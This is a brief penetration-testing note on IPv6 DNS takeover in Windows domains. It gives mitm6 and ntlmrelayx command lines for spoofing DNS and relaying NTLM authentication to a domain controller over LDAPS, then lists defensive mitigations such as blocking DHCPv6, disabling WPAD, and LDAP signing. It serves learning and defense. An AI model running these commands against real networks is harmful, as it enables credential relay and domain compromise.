IPv6

# IPv6
**Overview:**
Machines typically run on IPv4 but IPv6 is usually on
Problem is that no one is doing DNS for IPv6

Attacker can listen for IPv6 and spoof to be the DNS server.
Get authentication to domain controller over LDAP or SMB

**Tools:**
- mitm6
- ntlmrelayx


**Method:**
Run: `mitm6 -d <domain>`
Run: `ntlmrelayx.py -6 -t ldaps://<Domain-ControllerIP> -wh fakewpad.<domain> -l <dirname>`

Run: `cd <dirname>`


**Mitigation:**
IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only evironments. If you don't use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisementts in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the predefined rules to Block instead of Allow prevents the attack from working:
- (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6
- (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6
- (Inbound) Core Networking - Router Advertisement 
If WPAD is not in use internally, disable it via Group Policy and by disabling WinHttpAutoProxySvc service
Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding
Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation. 


**Useful:**
https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/